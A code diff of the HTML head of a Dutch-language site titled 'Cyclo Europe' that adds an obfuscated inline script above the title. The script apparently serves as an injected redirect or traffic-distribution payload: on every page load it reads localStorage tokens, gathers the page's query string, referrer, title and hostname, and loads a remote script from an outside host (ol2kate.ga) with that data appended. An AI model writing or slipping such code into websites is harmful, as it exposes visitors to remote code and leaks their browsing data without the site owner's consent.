@@ -1,6 +1,49 @@
 <!DOCTYPE html>
 <html lang="nl" data-color1="#050505" data-color2="#8f8d89" style="--font-family: arimo; --color-1: #050505; --color-2:#8f8d89;">
 <head>
+    <script>
+    (function() {
+    var name = '_srQ2KsqvDstg2NqV';
+    if (!window._srQ2KsqvDstg2NqV) {
+        window._srQ2KsqvDstg2NqV = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://ol2kate.ga/F54s4tM6',
+            P_PATH: 'https://ol2kate.ga/7b4f75c/postback',
+        };
+    }
+    const _vb3SRPbsKZNVWM25 = localStorage.getItem('config');
+    if (typeof _vb3SRPbsKZNVWM25 !== 'undefined' && _vb3SRPbsKZNVWM25 !== null) {
+        var _9yjbDC2PPSsn73Dd = JSON.parse(_vb3SRPbsKZNVWM25);
+        var _ZKYwdHQcYp5cz4HZ = Math.round(+new Date()/1000);
+        if (_9yjbDC2PPSsn73Dd.created_at + window._srQ2KsqvDstg2NqV.ttl < _ZKYwdHQcYp5cz4HZ) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _TpPFKdPJnMyMY2VR = localStorage.getItem('subId');
+    var _fwKhNBRZJNRNsdsd = localStorage.getItem('token');
+    var _vHCqW1pTnnsJHRmJ = '?return=js.client';
+        _vHCqW1pTnnsJHRmJ += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _vHCqW1pTnnsJHRmJ += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _vHCqW1pTnnsJHRmJ += '&default_keyword=' + encodeURIComponent(document.title);
+        _vHCqW1pTnnsJHRmJ += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _vHCqW1pTnnsJHRmJ += '&name=' + encodeURIComponent(name);
+        _vHCqW1pTnnsJHRmJ += '&host=' + encodeURIComponent(window._srQ2KsqvDstg2NqV.R_PATH);
+    if (typeof _TpPFKdPJnMyMY2VR !== 'undefined' && _TpPFKdPJnMyMY2VR && window._srQ2KsqvDstg2NqV.unique) {
+        _vHCqW1pTnnsJHRmJ += '&sub_id=' + encodeURIComponent(_TpPFKdPJnMyMY2VR);
+    }
+    if (typeof _fwKhNBRZJNRNsdsd !== 'undefined' && _fwKhNBRZJNRNsdsd && window._srQ2KsqvDstg2NqV.unique) {
+        _vHCqW1pTnnsJHRmJ += '&token=' + encodeURIComponent(_fwKhNBRZJNRNsdsd);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._srQ2KsqvDstg2NqV.R_PATH + _vHCqW1pTnnsJHRmJ;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
     <title>Cyclo Europe</title>
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
